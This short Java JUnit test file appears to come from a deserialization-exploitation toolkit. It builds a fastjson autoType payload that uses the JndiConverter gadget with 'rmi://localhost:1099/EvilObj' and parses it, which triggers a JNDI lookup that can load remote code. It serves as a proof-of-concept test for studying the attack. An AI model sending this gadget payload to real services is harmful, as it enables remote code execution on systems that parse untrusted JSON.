/*
 * This Java source file was generated by the Gradle 'init' task.
 */
package ysomap;

import com.alibaba.fastjson.JSON;
import org.junit.Test;

public class AppTest {
    @Test public void testAppHasAGreeting() {
        String jsonObject =
                "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\"," +
                        "\"asText\":\"rmi://localhost:1099/EvilObj\"}";
        JSON.parseObject(jsonObject);
    }
}